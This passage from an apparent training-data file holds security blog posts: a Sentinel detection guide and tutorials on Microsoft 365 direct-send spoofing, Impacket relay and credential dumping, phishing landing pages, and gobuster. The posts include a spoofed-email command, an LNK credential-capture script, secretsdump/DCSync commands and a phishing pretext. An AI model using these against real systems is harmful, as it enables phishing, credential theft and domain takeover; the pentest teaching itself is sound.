        "output": "Title: \"Geopolitical Cyber-Detection Lures for Attribution with Microsoft Sentinel\"\nTaxonomies: \"Author, Blue Team, Blue Team Tools, General InfoSec Tips & Tricks, How-To, Hunt Teaming, Informational, InfoSec 101, Jordan Drysdale, ARM Templates, Attribution, Detection, Engineering, Geopolitics, hunting, Microsoft Sentinel\"\nCreation Date: \"Tue, 17 May 2022 18:01:43 +0000\"\nJordan Drysdale //\n\nSummary!\n\nThere are tons of security event management (SIEM) solutions available these days, but this blog will focus on Microsoft Sentinel. Sentinel is easy to deploy, logs are inexpensive to retain, the platform is powerful, and even massive data queries are insanely responsive.  \n\nAttribution is fun, and scary too! Have you ever wondered who is attacking your Remote Desktop Protocol (RDP) exposures? Read on to learn this simple technique attackers hate! Have you ever wondered who is trying to compromise your Linux Secure Shell (SSH) exposures? Read on to find out why geopolitical cybersecurity has never been more interesting! Attackers hate these tactics because they produce an instant readout of the threats your organization is facing right now! Today! In real time! \n\nThis write-up assumes the following: \n\nYou have server assets exposed to the public internet \n\nYour server assets have RDP and SSH exposed \n\nYour server assets are running the Log Analytics agent and are connected to a Log Analytics (LA) workspace \n\nMicrosoft Sentinel is deployed and connected to the LA workspace \n\nOr, you can take the super basic query techniques here and apply them to your own internet-exposed servers. Since the only event IDs (EIDs) you need are 4624 and 4625, you do not need specialized audit policies in place either. The basic SIEM pseudo-logic could be: \n\n[from auth_eids, grab src_ip, compare to geoIP.csv, sort by count, output \"col1,col2,col3\"]\n\nIf you are planning to perform the following tasks with your own sandbox, a quick-deployment ARM template is available at www.doazlab.com. Please note that if you see errors while deploying the sandbox environment, file an issue on our GitHub at https://github.com/DefensiveOrigins/DO-LAB. Microsoft is constantly changing SKUs, product availability, and image names. We do our best to keep up with them. \n\nPre-Requisites!\n\nFirst things first, then next things next \u2014 make sure your VMs are connected to the Log Analytics (LA) workspace.\n\nOnce connected, Sentinel should show logs are being ingested.\n\nAs mentioned, next pre-reqs next! Head back over to the LA workspace (Home > LA-workspace). Use the north-south navigation pane to get to the \u2019Agents configuration.\u2019 Under Agents configuration, navigate to 'Syslog' and click to \u2019Add facility.\u2019 Add both the 1. authpriv and 2. auth facilities. The changes will auto-apply to the Linux agent and syslogs will start flowing almost immediately.\n\nThe Important Bits!\n\nWindows logs flowing? Check!\n\nSyslogs flowing? Check!\n\nSentinel operational? Check!\n\nTime is an interesting ally in this attribution approach. While reviewing this material, it looks like it takes about an hour for each of these services to get picked up by the attacking bot networks. Once identified, the pandemonium really gets rolling in earnest and we start to see the results we want.\n\nOne of our goals with this approach is to create our own threat intel, and by the end of this story, you should be wondering why your threat intel feeds are not providing this kind of data. The first query is owed to a brilliant student that Kent and I had in an early run of Applied Purple Teaming in 2022 \u2014 so, let\u2019s call this \u201cPierce\u2019s RDP attribution query.\u201d\n\nGo here: https://github.com/DefensiveOrigins/SentinelKQL\n\nCopy the \u201c// blog query 1\u201d bits shown below (skipping the README\u2019s description).\n\nPaste that KQL query over to your Sentinel > Logs > New Query pane. This query relies on simple parsing of the EID 4624 and 4625 events gathered from our exposed Windows systems. If you did not deploy the ARM template from doazlab.com, you may need to configure additional log collections on your VMs to ensure you have these events.\n\nRun this query and behold the magnificence of identifying some of the internet\u2019s most dangerous and uncaring adversaries. These folks script attacks, smash down doors, compromise systems, take over accounts, and rightfully escalate their compromises to their own version of \u201cTier 2 Support.\u201d\n\nQuick math: this is approximately 25,000 guesses against two systems in 24 hours. This is about 9 guesses per minute \u2014 and we are not taking EID 4776 into account with this query. If you honestly trust in your existing password policy, be it 8 or 10 characters, I have another story to tell you about compromise.\n\nBlack Hills InfoSec is a penetration testing firm. We author reports for a living and hack as a hobby. We are rather good at password attacks, and we usually find a way to recover an account or two in our time-limited and scope-controlled testing. These adversaries care not for your lockout policies, nor your log analytics capacities, nor the terms of your weeklong engagement. They do not care about your IR processes and are not flying under radar screens, but...\n\nMost businesses have never seen anything like this type of log analysis \u2014 and that means most of us are blind to this kind of attack. We are up against legitimate and terrifyingly persistent adversaries. We keep reading about compromise. We keep reading about ransomware. These results demonstrate so many things that make me shiver and keep me awake at night. Every single authentication service that gets exposed to the public internet has about an hour of quiet time and peaceful life from inception. After that, our service exposures are under an endless stream of attacks.\n\nAnyway, let\u2019s get back to it! We just parsed two of the most common Windows event IDs to produce an eye-opening result set.\n\n4624: An account was successfully logged on\n\n4625: An account failed to log on\n\nRandy Franklin Smith\u2019s Ultimate Windows Security is my first stop, every time, for matters involving Windows events.\n\nhttps://www.ultimatewindowssecurity.com/securitylog/encyclopedia/\n\nA quick investigation of our top attacker against the Cisco Talos Intelligence engine does not tell us much. A poor rating for its email reputation, likely because it was listed on one of the spam monitors.\n\nThese results are plus/minus a stroke over a double bogey on a par 3 but are par for the state of threat intelligence feeds. However, know that with this basic level of analysis, I would strongly advise that you should absolutely, 100%, without a doubt, block all traffic from the networks in the next screenshot.\n\nYa, I know, I\u2019m terrible at optimism! NEXT! What do the SSH logs look like?\n\nDo you remember earlier when I mentioned one of our brilliant students? Let\u2019s call this next one, \u201cPierce\u2019s SSH attribution query.\u201d You can find this with a quick page search here: https://github.com/DefensiveOrigins/SentinelKQL for \u201cSSH attribution.\u201d\n\nPaste this query over to Sentinel > Logs > New Query pane.\n\nThis query looks at Syslog messages with \u201cFailed Password\u201d which matches against the SSH logs and look about like the following:\n\nsshd: Failed password for user from IP\n\nOne remarkably interesting thing of note is that the difference has been consistent across my research over the last six months. Attacks against exposed RDP services are primarily sourced from Russian IP blocks. Attacks against exposed SSH services are primarily sourced from Southeast Asia. These are the facts.\n\nIt is straightforward to build your own geo-heatmaps as well. This step is beyond the scope of this blog but could look something like the following.\n\nImagine sorting this by successful logon (which you can) and seeing a country where you have zero workforce? How would you react? \n\nCheck back in as we continue the deep dive through more of Sentinel\u2019s amazing capabilities.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Spoofing Microsoft 365 Like Its 1995\"\nTaxonomies: \"Author, General InfoSec Tips & Tricks, How-To, Informational, Red Team, Steve Borosh, Microsoft 365, Spoofing, Steve Borosh\"\nCreation Date: \"Tue, 24 May 2022 18:37:17 +0000\"\nSteve Borosh //\n\nWhy Phishing?\n\nThose of us on the offensive side of security often find ourselves in the position to test our clients\u2019 resilience to phishing attacks. According to the Verizon 2021 Data Breach Investigations Report,1 phishing comprises 25% of all breaches. Phishing remains one of the top ways adversaries enter networks.\n\nDefense-in-Depth\n\nThe phrase \u201cdefense-in-depth\u201d has been used in the information security realm for a few years now, meaning defenders layer their protections instead of leaning too hard on a single solution. Email security especially requires the use of a defense-in-depth approach to phishing attacks. Enterprises may monitor for newly created phishing domains, filter, or block spam in the cloud, set SPF, DKIM, DMARC protection records, and scan or block file attachments. Along with user awareness training and offensive training engagements, these protections provide multiple layers of defense that create hurdles adversaries must clear, reducing their chances for success.\n\nPhishing Engagements\n\nThere are several types of phishing engagements often used for testing enterprises. Some types are:\n\nClick-rate tracking\n\nWho clicked?\n\nHow many times?\n\nCredential harvesting\n\nPasswords\n\nCookie theft\n\nPayload (attached or linked)\n\nMalicious Office Document (MalDoc)\n\nExecutables\n\nCompressed files\n\nMany organizations have automated phishing training. Often, these programs require users to click a link in an email which tracks their \u201cbad\u201d behavior. These training scenarios are great to introduce users to the potential hazards of phishing attacks, however, they may miss the mark when modeling more advanced adversaries.\n\nOffensive Perspectives\n\nPhishing is the bane of many when trying to gain access to their target enterprise. Phishing takes time and patience \u2014 lots of patience. If you\u2019re on offense with a limited timeframe and budget, getting through all the defensive layers, and staying there, takes precision. Even with all the patience and care taken to set up infrastructure, craft a phishing email, create a payload, and get it through defenses, all it takes is one user to report the phish and it\u2019s back to square one. Setting up new infrastructure, creating new pretext, generating new payloads, and sending from a new source all without being detected takes time, and again, patience.\n\nWhat if we could cut out the infrastructure pieces, skip past domain categorization, reputation, and \u201cbypass\u201d all the target enterprises' defenses with one command? Sound difficult? Let\u2019s dive in.\n\nMicrosoft Direct Send\n\nMicrosoft has documentation on a feature named \u201cdirect send\u201d.2 Direct send is most used by devices such as printers that print or scan to email inside an enterprise. Direct scan requires no authentication and may be sent from outside of the enterprise network.\n\nPrerequisites: Microsoft 365 subscription and an Exchange Online Plan.\n\nDirect send connects to an MX endpoint called a \u201csmart host.\u201d The smart host is in the format of \u201ccompany-com.mail.protection.outlook.com\u201d and is created by default when a new Exchange Online plan is created. Your device or host connects to the smart host via telnet on port 25 and sends unauthenticated email to internal users. Outbound emails are blocked. See the mail flow in the diagram3 below.\n\nFigure 1 - Direct Send Mail Flow\n\nSettings for direct send:\n\nMX endpoint, company-com.mail.protection.outlook.com\n\nPort 25 (yes, 25)\n\nTLS/StartTLS (optional)\n\nEmail address (does not need to have a mailbox)\n\nRecommended SPF settings from Microsoft\n\n\u201cv=spf1 ip4: include:spf.protection.outlook.com ~all\u201d\n\nSpoofing\n\nWith Microsoft direct send, inbound email will make it into the enterprise if that domain is trusted. So, in most cases with direct send, we can send mail from hr@company.com to anyone else inside company.com since the domain will trust itself. In many cases, we\u2019re also able to spoof external email addresses to internal users if those domains are trusted by the mail gateway \u2014 such as, \u201caccount-security-noreply@accountprotection.microsoft.com\u201d (used from Microsoft security emails) could be used as a From address.\n\nMicrosoft direct send does not allow mail to be delivered outside of the enterprise. So, no spoofing internal to external.\n\nAn added benefit of spoofing is that the From field populates with the From user\u2019s Microsoft icon as well. If we send an email from noreply@bigtimebank.com to user@company.com, the email from field will show the avatar of the \u201cnoreply\u201d user, typically the company logo.\n\nTo test this against your own newly created Exchange Online plan, add a \u201cBypass Spam Filter\u201d rule in the exchange admin center.4\n\nFigure 2 - Bypass Spam Filters for Trusted Domains\n\nThis rule allows internal emails to land in the inbox instead of \u201cJunk\u201d on default initial installations.\n\nTesting a Spoof\n\nSending a spoofed email is as simple as using a PowerShell command.\n\nHere\u2019s an example PowerShell command:\n\nSend-MailMessage -SmtpServer company-com.mail.protection.outlook.com -To frank@company.com -From informationsecurity@company.com -Subject \u201cUrgent Update Required\u201d -Body \u201cFrank,We need you to update your Microsoft Office software. Run this update as soon as you can please. No need to let me know when it\u2019s complete. Download\u201d -BodyAsHTML\n\nThis PowerShell cmdlet can also be found in PowerShell for Linux. With that in mind, it\u2019s possible to send your phishing emails from just about anywhere. One of my favorites is to send directly from Azure Cloud Shell, which is easily accessible from Windows Terminal. It\u2019s easy to rotate IP addresses this way. Azure Cloud Shell is easily accessible from the Windows Terminal App.\n\nFigure 3 - Windows Terminal App\n\nFigure 4 - Sending an Email from Azure Cloud Shell\n\nSPAMHAUS\n\nSPAMHAUS will block most residential IP addresses from sending emails. Don\u2019t send phishing emails from your house.\n\nMail Gateways\n\nIn testing against enterprises that utilize third-party mail gateways, spoofing has been extremely successful using this technique. While mail may still flow through the email gateway, default configurations may trust email originating from their own domain and *.mail.protection.outlook.com.\n\nExchange Online Protection\n\nExchange Online Protection (EOP) is a Microsoft cloud-based email filter that protects enterprises against email threats. EOP is included by default with all Microsoft 365 enterprises using Exchange Online mailboxes. Keep in mind that \u201cMicrosoft Defender for Office 365\u201d is a separate offering and not covered in this blog post.\n\nEmail flows through Exchange Online as detailed in the diagram5 below.\n\nFigure 5 - Exchange Online Mail Flow\n\nInbound email is first scrutinized for sender reputation where most spam is diverted or stopped.\n\nNext, each message is scanned for malware. Learn more about anti-malware protection here. It should be noted that direct-send-spoofed messages still pass through these protections. Attachments may be detonated in a sandbox. Microsoft provides a \u201ccommon attachments filter\u201d that enables defenders to block specific file types by default. This setting is disabled by default and when enabled, blocks these file extensions by default: ace,ani,app,cab,docm,exe,iso,jar,jnlp,reg,scr,vbe,vbs.\n\nMessages then continue through mail flow rules.\n\nFinally, messages pass through content filtering (anti-spam, anti-spoofing) and are routed accordingly.\n\nFor a full list of features available by EOP, visit: https://docs.microsoft.com/en-us/microsoft-365/security/office-365-security/exchange-online-protection-overview?view=o365-worldwide#eop-features.\n\nFigure 6 - High-Risk Delivery Pool Criteria\n\nUnfortunately, if we\u2019re sending our spoof through a proxy that doesn\u2019t have A and MX records matching the From domain, our mail will be even more scrutinized. A phishing template often used for Microsoft device code phishing6 currently enters an unknown abyss when sent.\n\nMicrosoft IP Banning\n\nDuring a phishing engagement, your IP may become soft-banned by Microsoft. No worries there, you may submit a request to be unbanned or change your IP address. If you\u2019re using Cloud Shell to send a phishing email, restarting the console will provide you with a new IP address. If you want to unblock an IP, it takes just a few minutes and you\u2019re back in business. Visit https://sender.office.com and enter the details to unblock.\n\nFigure 7 - Unblock Banned IP Address\n\nBreaking It Down\n\nWith Microsoft direct send, we\u2019re able to send emails on behalf of external or internal users to other internal users inside enterprises using Microsoft 365; in essence, spoofing emails into many organizations.\n\nThis works because Microsoft utilizes \u201csmart hosts\u201d for Exchange typically located at an address like company-com.mail.protection.outlook.com that allows unauthenticated SMTP relays to internal users.\n\nExternal third-party email gateways are a great way to catch most spam or spoofing attempts. Spoofing with Microsoft direct send may bypass many of these gateways and land you in the inbox.\n\nThis spoofing technique has been extremely successful in landing phishes into enterprise inboxes. However, while simple emails may land in the inbox, common phishing templates or attachments may be blocked. As always, it\u2019s important to test your infrastructure prior to sending live emails into your target enterprise.\n\nFor Defenders\n\nDefenders should test the ability to send internal emails via direct send and ensure that any email gateways adhere to the proper mail flow for internal recipients. There is no \u201cDisable Direct Send\u201d feature in Microsoft 365. It is necessary to correctly set your mail gateway settings to allow specific IP addresses to send emails on behalf of the enterprise. Refer to your mail gateway documentation.\n\nClosing\n\nAt the time of this writing, this finding has been submitted to MSRC and CLOSED per Microsoft without a fix. I hope this blog post highlights the dangers posed by Microsoft direct send regarding spoofed phishing attacks and enables defenders to better protect their network while providing offensive operators another technique to test and enhance enterprise defenses.\n\nSpecial thanks to @ustayready for pointing me down this research path. Check out his handy Python script7 for sending spoofed messages as well.\n\nReferences\n\n1. https://www.verizon.com/business/resources/reports/dbir/2021/results-and-analysis/ \n\n2. https://docs.microsoft.com/en-us/exchange/mail-flow-best-practices/how-to-set-up-a-multifunction-device-or-application-to-send-email-using-microsoft-365-or-office-365\n\n3. https://docs.microsoft.com/en-us/exchange/exchangeonline/media/cb07aae7-ca31-43a7-a468-74c293b37a66.png\n\n4. https://admin.exchange.microsoft.com/#/transportrules\n\n5. https://docs.microsoft.com/en-us/microsoft-365/media/tp_emailprocessingineopt3.png?view=o365-worldwide \n\n6. https://0xboku.com/2021/07/12/ArtOfDeviceCodePhish.html\n\n7. https://gist.github.com/ustayready/b8314a4a964ff498f7b4682fc66475cc\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Impacket Offense Basics With an Azure Lab\"\nTaxonomies: \"Author, External/Internal, General InfoSec Tips & Tricks, How-To, Informational, InfoSec 101, InfoSec 201, Jordan Drysdale, Red Team Tools, Jordan Drysdale\"\nCreation Date: \"Wed, 01 Jun 2022 18:00:36 +0000\"\nJordan Drysdale //\n\nOverview\n\nThe following description of some of Impacket\u2019s tools and techniques is a tribute to the authors, SecureAuthCorp, and the open-source effort to maintain and extend the code. \n\nhttps://github.com/SecureAuthCorp/impacket\n\nLab Setup\n\nARM template here: doazlab.com or github.com/DefensiveOrigins/DO-LAB\n\nAuthenticate to an Azure subscription where you can construct resources. Deploy lab.\n\nDomain controller and joined workstation\n\nUbuntu\n\nntlmrelayx.py\n\nThe attack scenario below emulates Mitre ATT&CK 1204: Malicious Link. \n\nhttps://attack.mitre.org/techniques/T1204/001/\n\nThe attacker leaves an LNK file on a network file share to trigger silent authentication to a malicious target. All unprotected visitors to the file share submit credentials without user interaction. Yes, this is scary. The following PowerShell commands generate the shortcut file \u2013 LNK \u2013 and target the ntlmrelayx listener.\n\ncd c:\\\nmkdir c:\\file6\nNew-SmbShare -Name \"file6\" -Path \"C:\\file6\" -ChangeAccess \"Users\" -FullAccess \"Administrators\"\n$objShell = New-Object -ComObject WScript.Shell\n$lnk = $objShell.CreateShortcut(\"c:\\file6\\malicious.lnk\")\n$lnk.TargetPath = \"\\\\10.0.0.8\\@threat.png\"\n$lnk.WindowStyle = 1\n$lnk.IconLocation = \"%windir%\\system32\\shell32.dll, 3\"\n$lnk.Description = \"Users browsing any file share with this LNK file triggers SMB auth.\"\n$lnk.HotKey = \"Ctrl+Alt+O\"\n$lnk.Save()\n\nThe ntlmrelayx.py listener setup below targets an SMB listener on a remote server (ws05.doazlab.com). This attack emulates Mitre ATT&CK T1557: Adversary in the Middle. \n\nhttps://attack.mitre.org/techniques/T1557/001/\n\nThe following commands launch the virtual environment installed during the lab deployment. *Note: virtual environments simplify Python tooling requirement installations and are easy to use. This most basic invocation attacks the workstation\u2019s listening SMB port on TCP/445.\n\nsudo -s\ncd /opt/impacket\nsource imp-env/bin/activate\ncd examples\nntlmrelayx.py -t 192.168.2.5 -smb2support | tee \u2013a /opt/impacket/relay1.log\n\nThe hapless victim visits the file share with the attacker\u2019s LNK and triggers authentication to the ntlmrelayx.py listener\u2019s TCP/445 relay.\n\nWhen the relayed victim has admin privileges on the target system, ntlmrelayx dumps NT hashes through the remote registry service.\n\nAn attacker can also attack LDAP services listening on domain controllers. In its most basic form, that attack looks something like the next command. You would need to swap DC names, IP addresses, and make sure secure LDAP is listening on TCP/636 on your target.\n\nntlmrelayx.py -t ldaps://dc01.doazlab.com\n\nThis listening setup cannot rely on the poisoned SMB share mentioned earlier that served as the source of our initial foothold through share poisoning. You cannot relay SMB authentication challenge responses to LDAPs; it does not work.\n\nInstead, this attack might rely on a browser proxy configuration hijack. Through basic poisoning configuration, you might see something like the following upon successful HTTP challenge authentication (poisoned, hijacked, whathaveyou).\n\nWith all that output in mind, this tool just hijacked the domain without us having to do much. The default settings (given sufficient relayed privileges) wreaked havoc on the target domain. We need to understand what is happening under the hood a bit more. The following invocation is closer to a standard approach for me, and we will talk about each of the flags and why.\n\nntlmrelayx.py -t ldaps://dc01.doazlab.com -ts -l /opt/impacket/loot --add-computer BHISBlog47 --dump-laps --no-dump --no-da\n\nHere is the usage output (ntlmrelayx.py -h) and (obviously) there are a lot of options.\n\nBack to the previous usage scenario \u2014 what happened there? In theory, this attack technique kinda matched against an older version of the Mitre ATT&CK technique T1136: Add a Domain Account.\n\nhttps://attack.mitre.org/techniques/T1136/002/\n\nThis does not match closely to a technique I can find in the current matrix, and this is likely a function of my ability to find it rather than a blind spot in the matrix.\n\nntlmrelayx.py -t ldaps://dc01.doazlab.com -ts -l /opt/impacket/loot --add-computer BHISBlog47 --dump-laps --no-dump --no-da\n\n-t: target specification, in this case, the secure LDAP listener on a DC\n\n-ts: add timestamps to the console output\n\n-l: define a loot directory\n\n--add-computer: as it reads, but generate a random password\n\n--dump-laps: as it reads, relayed user requires sufficient privileges to read related schema attributes\n\n--no-dump: do not dump the AD users, groups, etc (LDAPDomainDump)\n\n--no-da: do not attempt to create a domain admin\n\nAnother strongly advised step when running these tools is to write your own log file. I like to add a pipe output like so:\n\n | tee -a /opt/impacket/relay.log.\n\nThere is so much more ntlmrelayx.py is capable of, and should desire sufficiently warrant, we will put together an even deeper dive. However, let\u2019s take a look at a couple more tools in the Impacket library before concluding this write-up.\n\nGetADUsers.py\n\nThe GetADUsers.py class can turn that first compromise into an accurate user list. This attack could be referenced in MITRE ATT&CK as T1087, Account Discovery: Domain Account. This is basic enumeration in the attack technique matrix.\n\nhttps://attack.mitre.org/techniques/T1087/002/\n\npython3.9 GetADUsers.py -all -ts doazlab.com/doadmin:'DOLabAdmin1!' -dc-ip 192.168.2.4 |tee -a /opt/adusers.txt\n\nThis text output now serves as another reference point for expanding attacks against the domain. This step is somewhere in the attack matrix, but I would say as a pentester, I am going to rely on BloodHound datasets long before I go hunting for this output. This is only an opinion and is subject to change.\n\nGet-GPPPassword.py\n\nContrary to GetADUsers.py and its infrequent use in my arsenal, the Get-GPPPassword.py class is more commonly used. This is a quick check against Microsoft\u2019s unintentional publishing of the decryption scheme for the group policy preference password storage. We are still finding these passwords in the wild, but it is becoming less frequent.\n\npython3.9 Get-GPPPassword.py 'doazlab.com'/'doadmin':'DOLabAdmin1!'@'192.168.2.4'\n\nThis attack maps against MITRE ATT&CK, a sub-technique under T1552, Unsecured Credentials: Group Policy Preferences.\n\nhttps://attack.mitre.org/techniques/T1552/006/\n\nWe did not recover any credentials with this attack against the lab environment, but you might.\n\nGetUserSPNs.py\n\nThe GetUserSPNs.py class was designed to gather Kerberos ticket hashes from a domain. This attack is classified as a sub-technique of MITRE ATT&CK T1558, Steal or Forge Kerberos Tickets.\n\nhttps://attack.mitre.org/techniques/T1558/003/\n\npython3.9 GetUserSPNs.py 'doazlab.com'/'doadmin':'DOLabAdmin1!' -dc-ip 192.168.2.4 -outputfile /opt/hashes/kerbs.txt\n\nThe -outputfile command option provided the crackable Kerberos ticket material below in Hashcat ready format.\n\nSecretsdump.py\n\nFinally, let\u2019s review Secretsdump.py. Two unique usage scenarios will be presented below. The first attack dumps credential material from a remote system where administrative privilege has been obtained. This attack aligns with MITRE ATT&CK T1003, OS Credential Dumping.\n\nhttps://attack.mitre.org/techniques/T1003/003/\n\nThe syntax below is the most basic usage and will attempt a dump of LSA secrets and the SAM table of the targeted remote system.\n\npython3.9 secretsdump.py doazlab/doadmin:'DOLabAdmin1!'@192.168.2.5 |tee -a /opt/hashes/secrets-output.txt\n\nThis attack is surprisingly hard to detect with standard Windows optics, but we will cover that discussion in the defensive tactics companion write up.\n\nThe second Secretsdump.py invocation is the NTDS.dit capture. This has the same parent technique, T1003, OS Credential Dumping, but is a different sub-technique. In this case, the MITRE sub-technique is listed as DCSync.\n\nhttps://attack.mitre.org/techniques/T1003/006/\n\nDid I mention that hashes are good enough to sync secrets on a domain?\n\npython3.9 secretsdump.py -outputfile 'doazlab.dit' \n'doazlab.com'/doadmin@'192.168.2.4' -hashes \naad3c435b514a4eeaad3b935b51304fe:3606a042149187931ced1f8cedafe26c\n\nThanks for reading.\n\n-jd\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Phishing Made Easy(ish)\"\nTaxonomies: \"How-To, Informational, InfoSec 101, Phishing, Red Team, Social Engineering, ansible, automation, credential capture, ethical, hacking, html\"\nCreation Date: \"Tue, 07 Jun 2022 15:02:08 +0000\"\nHannah Cartier //\n\nSocial engineering, especially phishing, is becoming increasingly prevalent in red team engagements as well as real-world attacks. As security awareness improves and systems become more locked down, it is unsurprising that the human element of security is becoming a more appealing attack vector. In addition, phishing campaigns can be used to test the controls surrounding a company's employees. Scoring one valid login to a target's resources can save a tester hours or even days of vulnerability scanning and exploitation. \n\nIn this blog, we are going to walk through setting up a simple yet effective landing page for your phishing campaigns. We will be using an open-source tool developed by BHIS that requires minimal installation and does not use any paid or third-party components.\n\nMotivation\n\nA while back, I was asked to set up a landing page for a phishing engagement. And that was the extent of the instructions I received. To build this page, I first attempted to create a simple registration form using WordPress. It turned out that either WordPress was more complicated than I had anticipated, or I wasn\u2019t as tech-savvy as I liked to believe. (In hindsight, it was probably a bit of both.) After fighting the interface for a few hours with my patience diminishing and the test date soon approaching, I decided it might be time to jump ship. However, I am also a rather mediocre web developer, and setting up everything from scratch each time clearly was not a sustainable solution.\n\nUltimately, I set the thing up from scratch. I designed the landing page using open-source HTML templates, served them up with NGINX, and forwarded the form submissions through the NGINX reverse proxy to a flask server where the client IP, user-agent, and form data are written to a log. Then I developed a tool called Sinker to automate this entire process so I would never have to do it again.\n\nThe remainder of this blog walks through an example of how one would use this tool to set up a phishing campaign.\n\nTarget: Black Hills Information SecurityDomain: blackhills.phishingdomain.com\n\nPhishing Email:\n\nRE: New Health and Safety Measures. Complete before ARBITRARY_DATE\n\nBlack Hills Infosec understands that the health and wellbeing of our employees is of upmost importance. Amid the current Covid-19 climate, along with recent CDC amendments to health and safety measures, it is important to take precautions and respect each others concerns. Our insurance partners are working with PCHC to bring you the most up to date information on risks and information including covid-19 booster information, internal case counts, etc. Please follow the link below to set up your account on our health and safety portal. This must be completed in order to stay enrolled in any of our insurance plans. (Note: For your convenience, please use your Black Hills Infosec email and password for registering)\n\nBam. Now, all we need is for there to actually be something at that \u201clink below\u201d through which we can capture credentials. This is precisely what our tool, Sinker, assists in building and deploying.\n\nDeployment\n\nRequirements\n\nAn internet-accessible server on which to host your landing page (running Debian, ideally Ubuntu)\n\nA domain with DNS A records pointing to your server\n\nSetup\n\nClone the GitHub repository located here: https://github.com/Hannnah1/Sinker \n\nOpen the inventory file and replace the IP address with the public IP of your server. If you wish to deploy the phish on more than one, add another line for each additional IP.\n\nIf you do not have Ansible installed on your local machine, run runme_first.sh (Note: For Windows users, you will have to install Ansible manually or run the program through WSL).\n\nNext, open vars.yml and change the following configuration variables:\n\nsite: The directory containing the landing page. This must exactly match one of the directory names under the phishinglines/ directory.\n\ntarget_name: The name of the target company as we would like it to appear on our landing page\n\nssh_key: The location of the SSH key to be used for logging in to the remote server\n\ndomain_name: Your domain name\n\ncertbot_mail_address: The email to be used for generating the letsencrypt certificate. We will only be allowing our targets to connect over https.\n\nExample:\n\n#--------------------------------------------------------------------------#\n# Config variables. Do change these #\n#--------------------------------------------------------------------------#\nsite: covidruse\n\nTarget_Name: Black Hills # Spaces are OK, no quotes please\nssh_key: $HOME/.ssh/id_rsa\ndomain_name: blackhills.phishingdomain.com\ncertbot_mail_address: hcartier@blackhillsinfosec.com\n\n# CSS For landing page NO SEMICOLONS\nbackground_color: white\nprimary_color: rgba(156, 191, 191, 1)\nsecondary_color: black\n\nThe code snippet above has been edited for attacking Black Hills Information Security. In addition to the company name, we have also customized the primary and secondary color values for the CSS. Using the colors of our target company will help with the believability of our page due to the element of familiarity.\n\nThat's it for configuration, now it's time to run the playbook. This can be done by entering the following command in your terminal:\n\nansible-playbook main.yml\n\nThis next step is the most important:\n\nTake your hands off the keyboard, stand up, and go make a nice hot cup of coffee while the program does the following on your behalf.\n\nUpdates packages\n\nInstalls nginx\n\nConfigures nginx for your domain and landing page\n\nGenerates a letsencrypt certificate using certbot\n\nCopies the templates and any other contents of your landing page directory to /var/www/\n\nInstalls tmux\n\nRuns a flask app inside of the tmux session to receive form submissions forwarded by nginx and write them to a log file\n\nIf all goes well you should see the following output:\n\nIf you do not have Cowsay installed, the output will be formatted a bit differently, and you will be seen by your coworkers as much less cool. As long as no failed or unreachable errors are produced, you're good to go.\n\nBrowsing blackhills.phishingdomain.com demonstrates that our landing page is displayed as expected.\n\nUpon submitting the form, the target received the following acknowledgment that their submission was received. The objective of this confirmation is to not raise suspicion.\n\nThe server logs the IP address of the client, the name, email, and password they entered, as well as the user agent. If we log into our server console and look at forms.txt, we will see the following:\n\nCreating Additional Landing Pages\n\nThere are hundreds of free HTML templates that can be quickly edited to fit your needs.\n\nFor example, in this blog, we adapted the template found here: https://tympanus.net/Tutorials/LoginRegistrationForm/index3.html#toregister\n\nTo be compatible with these automated setup scripts, you will need to make the following changes:\n\nAnywhere you want the target company's name to appear, replace that spot with the exact text {{ Target_Name }}\n\nYour form must have an element with id=\"name\", id=\"email\" and id=\"password\"\n\nYou must ensure your submit button is of type \"submit\", and insert the send.js script.\n\n type=\"submit\">Complete Registration\n src=\"send.js\">\n\nYour page must be titled target.html.j2 following the template format.\n\nCongrats! You now have a landing page that can be quickly spun up for multiple engagements.\n\nConclusion:\n\nPhishing is easy but can be time-consuming. Hopefully this program can help make it a little simpler and faster. The author recommends NOT including the names and emails of people who fell for the phish in the report for the client. Knowing exactly whose credentials you gained does not help in remediation and could potentially get that person in trouble.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"For Web Content Discovery, Who You Gonna Call? Gobuster!\"\nTaxonomies: \"Author, External/Internal, General InfoSec Tips & Tricks, Melissa Bruno, Web App\"\nCreation Date: \"Tue, 14 Jun 2022 17:11:06 +0000\"\nMelissa Bruno //\n\nOne of the best early steps to take when testing a network, especially a large one, is to run the tool EyeWitness to gain a quick understanding of what types of web applications are present in the environment.\n\nIn some cases, valuable information may be sitting in plain sight on the homepage of a poorly secured web application. Other times, you might glean the names and version numbers of vulnerable pieces of software from HTTP headers and source code, then leverage known exploits to your advantage. Sometimes gaining admin access to software is as simple as looking up the manual for a web content management service, then plugging in the default URL of the admin portal and default credentials.\n\nBut what about web applications that don\u2019t give you much to work with? Maybe the root directory returns a blank page, or an HTTP 404 \u201cNot Found\u201d error, and the HTTP headers show up-to-date software version numbers or no useful information at all. This is where automated guesses can come into play.\n\nScripts and automated tools can be used to check for common files and directories that may be running on a web server. \n\nOne such tool is gobuster.\n\nInstalling Gobuster\n\nDepending on your operating system, you may be able to install gobuster directly with a package manager. Otherwise, gobuster will run on any system that can run the latest version of the Go programming language. For the latter method, you will first need to download the latest version of Go here: https://golang.org/dl/ and then install it using the instructions here: https://golang.org/doc/install.\n\nOnce Go is set up, simply run the command go install github.com/OJ/gobuster/v3@latest to install the latest version of gobuster. The \u201cgo install\u201d command will place the gobuster executable file in either the $GOPATH/bin or $HOME/go/bin directories.\n\nRunning Gobuster\n\nTo demonstrate the usage of gobuster, I set up a directory with a few files and hosted them locally using a simple HTTP server with Python 3, which you can do yourself by creating a directory with the files that you want to host, navigating to that directory, and then using the command:\n\npython3 -m http.server 8000 --bind 127.0.0.1\n\nNext, in the directory containing the gobuster executable file, create two more files \u2014 one with a list of filenames that you want to check for and one with a list of directory names. I used SecLists\u2019 raft-medium-directories.txt and raft-medium-files.txt lists. Check if the server has any of the directories in your list with this command:\n\ngobuster dir -u http://127.0.0.1:8000/ -w raft-medium-directories.txt\n\nIn the output section, we can see that gobuster picked up the /important directory. Now I\u2019ll check that directory for the presence of any of the files in my other list:\n\ngobuster dir -u http://127.0.0.1:8000/important/ -w raft-medium-files.txt\n\nNow, gobuster has identified a file, /secret.html. Navigating to it returns an (admittedly low-effort) representation of a webpage containing confidential data.\n\nFine-Tuning 